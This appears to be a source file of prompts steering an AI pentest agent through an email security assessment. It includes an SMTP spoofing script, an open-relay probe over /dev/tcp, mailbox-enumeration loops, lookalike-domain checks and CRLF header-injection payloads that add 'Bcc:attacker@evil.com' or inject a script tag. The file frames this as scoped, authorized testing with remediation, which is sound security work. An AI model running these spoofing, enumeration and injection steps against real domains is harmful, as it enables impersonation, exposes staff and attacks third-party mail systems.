"""
RedAmon Email Security Assessment Prompts

Domain-level email infrastructure security testing: SPF, DMARC, DKIM,
MX record analysis, open relay detection, email header injection,
mailbox enumeration, and business-email-compromise (BEC) infrastructure testing.

This skill is DISTINCT from phishing_social_engineering:
- phishing_social_engineering builds payloads for target users to execute
- email_security_assessment tests the DOMAIN'S email security configuration
"""

# =============================================================================
# EMAIL SECURITY MAIN WORKFLOW
# =============================================================================

EMAIL_SECURITY_TOOLS = """
## ATTACK SKILL: EMAIL SECURITY ASSESSMENT

**CRITICAL: This attack skill has been CLASSIFIED as Email Security Assessment.**
**You MUST follow the email security workflow below.**

This skill covers SIX email security pillars:
1. **DNS record analysis** — SPF, DMARC, DKIM, MX, TXT, CAA records
2. **Email spoofing assessment** — can the domain be spoofed? Is DMARC enforced?
3. **Open relay / misconfigured MTA testing** — can the server relay mail?
4. **Mailbox enumeration** — validate user existence via SMTP VRFY/RCPT TO
5. **Email header injection** — can attacker-controlled headers reach inboxes?
6. **BEC infrastructure readiness** — domain similarity, lookalike domains,
   executive email exposure

---

## PRE-CONFIGURED SETTINGS (from project settings)

```
SPF/DMARC/DKIM analysis enabled:  {email_dns_analysis_enabled}
Spoofing test enabled:            {email_spoofing_enabled}
Open relay test enabled:          {email_open_relay_enabled}
Mailbox enumeration enabled:      {email_enum_enabled}
Header injection test enabled:    {email_header_injection_enabled}
BEC / lookalike check enabled:    {email_bec_enabled}
Target domain:                    {email_target_domain}
Executive names list:             {email_executives}
SMTP server hint:                 {email_smtp_hint}
```

**Hard rules:**
- If `Spoofing test enabled: False`, do NOT send spoofed emails. Only analyze DNS records.
- If `Open relay test enabled: False`, do NOT attempt SMTP relay tests.
- If `Mailbox enumeration enabled: False`, do NOT run VRFY/RCPT TO enumeration.
- NEVER send emails to external third parties. Only send to operator-controlled
  test mailboxes or internal catch-all addresses.
- Respect rate limits on SMTP servers. Max 10 RCPT TO probes per minute.

---

## MANDATORY EMAIL SECURITY WORKFLOW

### Step 1: DNS record reconnaissance (kali_shell / execute_curl)

Query all email-relevant DNS records for the target domain:

```
# MX records
kali_shell({{"command": "dig MX <TARGET_DOMAIN> +short"}})
# SPF record
kali_shell({{"command": "dig TXT <TARGET_DOMAIN> +short | grep 'v=spf1'"}})
# DMARC record
kali_shell({{"command": "dig TXT _dmarc.<TARGET_DOMAIN> +short"}})
# DKIM selectors (common)
kali_shell({{"command": "for sel in default selector1 selector2 google mail dkim; do dig TXT $sel._domainkey.<TARGET_DOMAIN> +short; done"}})
# MTA-STS
kali_shell({{"command": "dig TXT _mta-sts.<TARGET_DOMAIN> +short"}})
# TLS-RPT
kali_shell({{"command": "dig TXT _smtp._tls.<TARGET_DOMAIN> +short"}})
# BIMI
kali_shell({{"command": "dig TXT default._bimi.<TARGET_DOMAIN> +short"}})
```

Capture: all record values, TTLs, and any parsing errors.

**After Step 1, request `transition_phase` to exploitation if the user wants active testing.**

### Step 2: Record analysis and misconfiguration detection

**SPF analysis:**
- `+all` or `?all` → permissive, spoofable
- `~all` → softfail (some receivers may accept)
- `-all` → strict, harder to spoof
- Includes that resolve to non-existent domains → DNS-based bypass
- Multiple SPF records → invalid, unpredictable behavior

**DMARC analysis:**
- Missing record → spoofable
- `p=none` → no enforcement
- `p=quarantine` → partial enforcement
- `p=reject` → strict enforcement
- `pct<100` → partial coverage, bypassable on remaining percentage
- `rua` missing → no reporting, operator unaware of spoofing

**DKIM analysis:**
- Missing selectors → no cryptographic validation
- Weak key sizes (<1024 bit RSA) → forgeable signatures
- Key rotation absent → long-term exposure if leaked

### Step 3: Spoofing proof-of-concept (CONDITIONAL on `Spoofing test enabled`=True)

Send a test email from a spoofed address to an operator-controlled inbox:

```python
# language: python
import smtplib
from email.mime.text import MIMEText

msg = MIMEText("RedAmon email security test — please verify receipt")
msg["Subject"] = "Email Security Test"
msg["From"] = "security@test.<TARGET_DOMAIN>"
msg["To"] = "<OPERATOR_TEST_EMAIL>"
msg["Reply-To"] = "attacker@evil.com"

# Use target's MX or operator-provided SMTP
with smtplib.SMTP("<TARGET_MX>", 25, timeout=10) as s:
    s.send_message(msg)
    print("SENT")
```

If the message arrives in the operator's inbox without SPF/DMARC warnings,
spoofing is possible. Document: receiving server, headers, authentication-results.

### Step 4: Open relay / SMTP misconfiguration (CONDITIONAL on `Open relay test enabled`=True)

```
# Test if the MX accepts relay to external domains
kali_shell({{"command": "timeout 10 bash -c 'exec 3<>/dev/tcp/<TARGET_MX>/25; echo \"EHLO redamon.test\" >&3; echo \"MAIL FROM:<test@redamon.test>\" >&3; echo \"RCPT TO:<external@gmail.com>\" >&3; cat <&3'"}})
```

Also test for backscatter, NDR abuse, and bounce address tagging verification (BATV) gaps.

### Step 5: Mailbox enumeration (CONDITIONAL on `Mailbox enumeration enabled`=True)

```
# SMTP VRFY / RCPT TO enumeration
kali_shell({{"command": "for user in admin root postmaster webmaster support helpdesk; do echo \"VRFY $user@<TARGET_DOMAIN>\"; done | nc -w 2 <TARGET_MX> 25"}})
```

Or use Python for more reliable parsing:

```python
# language: python
import smtplib, socket
users = ["admin", "root", "postmaster", "webmaster", "support", "helpdesk", "info", "sales", "marketing", "hr"]
for user in users:
    try:
        with smtplib.SMTP("<TARGET_MX>", 25, timeout=10) as s:
            s.ehlo()
            code, _ = s.rcpt(f"{{user}}@<TARGET_DOMAIN>")
            print(user, code)
    except Exception as e:
        print(user, "ERR", e)
```

250 = valid mailbox, 550 = invalid. Document valid addresses found.

### Step 6: Header injection testing (CONDITIONAL on `Header injection test enabled`=True)

Test if web forms or APIs allow injection of SMTP headers:

```
# Contact form / newsletter signup with header injection payload
execute_curl({{"args": "-s -X POST -d 'name=test&email=test%0d%0aBcc:attacker@evil.com&submit=1' http://TARGET/contact"}})
execute_curl({{"args": "-s -X POST -d 'name=test&email=test%0d%0aSubject:HACKED&message=test' http://TARGET/contact"}})
```

If a Bcc or Subject header injection reaches the operator's test mailbox,
document the exact payload and affected endpoint.

### Step 7: BEC / lookalike domain check (CONDITIONAL on `BEC check enabled`=True)

Check for domain variants that could be used in executive impersonation:

```
# Homoglyph and typo variants
kali_shell({{"command": "for tld in com net org io co uk info biz; do echo '<TARGET_DOMAIN>'.$tld; done | dnsx -a -silent"}})
# Executive name + domain combinations
kali_shell({{"command": "for exec in john.smith jane.doe ceo cfo cio; do echo $exec@<TARGET_DOMAIN> | dnsx -mx -silent; done"}})
```

Also search for the domain on certificate transparency and domain registration
sites for lookalikes.

### Step 8: Reporting requirements

The final report MUST contain:
- **DNS records** (SPF, DMARC, DKIM, MX, MTA-STS, TLS-RPT, BIMI)
- **Spoofing verdict** (spoofable / partially protected / protected)
- **DMARC policy** (p=none/quarantine/reject, pct, rua presence)
- **Open relay status** (open / closed / partial)
- **Valid mailboxes enumerated** (usernames confirmed via SMTP)
- **Header injection findings** (affected endpoints, payload, result)
- **BEC risk** (lookalike domains, executive email exposure)
- **Remediation** (SPF hardening, DMARC p=reject, DKIM key rotation,
  VRFY disable, SMTP auth, BATV, header sanitization)

### Proof Levels

| Level | Evidence | Classification |
|-------|----------|----------------|
| 1 | DNS records enumerated and analyzed | INFORMATIONAL |
| 2 | SPF/DMARC/DKIM misconfiguration identified | POTENTIAL |
| 3 | Spoofed email delivered to inbox, or valid mailboxes enumerated | EXPLOITED |
| 4 | Open relay confirmed, or header injection reaches recipient | EXPLOITED (CRITICAL) |
"""


# =============================================================================
# EMAIL SECURITY PAYLOAD REFERENCE
# =============================================================================

EMAIL_SECURITY_PAYLOAD_REFERENCE = """
## Email Security Payload Reference

### SPF record syntax quick reference

```
v=spf1 include:_spf.google.com ~all          # Softfail
v=spf1 include:_spf.google.com -all          # Strict (recommended)
v=spf1 +all                                   # Permissive (vulnerable)
v=spf1 ip4:192.0.2.0/24 -all                  # IP range only
```

### DMARC record syntax quick reference

```
v=DMARC1; p=none; rua=mailto:dmarc@domain.com           # Monitoring only
v=DMARC1; p=quarantine; pct=100; rua=mailto:dmarc@...   # Partial enforcement
v=DMARC1; p=reject; pct=100; rua=mailto:dmarc@...       # Full enforcement (recommended)
v=DMARC1; p=reject; pct=10; rua=mailto:dmarc@...        # Partial coverage (bypassable)
```

### DKIM selector wordlist

```
default
selector1
selector2
google
mail
dkim
s1
s2
key1
key2
k1
k2
```

### SMTP enumeration response codes

| Code | Meaning | Interpretation |
|------|---------|----------------|
| 250 | OK / user exists | Valid mailbox |
| 251 | User not local, will forward | Forwarding address |
| 550 | Mailbox unavailable | Invalid mailbox |
| 552 | Mailbox full | Valid but full |
| 553 | Mailbox name not allowed | Invalid format |
| 502 | Command not implemented | VRFY disabled |

### Header injection payloads

```
test%0d%0aBcc:attacker@evil.com
test%0d%0aCc:attacker@evil.com
test%0d%0aSubject:Urgent+Action+Required
test%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1)</script>
```

### Open relay test sequence

```
EHLO redamon.test
MAIL FROM:<test@redamon.test>
RCPT TO:<external@gmail.com>
DATA
Subject: Relay test
Relay test body
.
QUIT
```

If RCPT TO to an external domain returns 250 and the message is accepted,
the server is an open relay.
"""
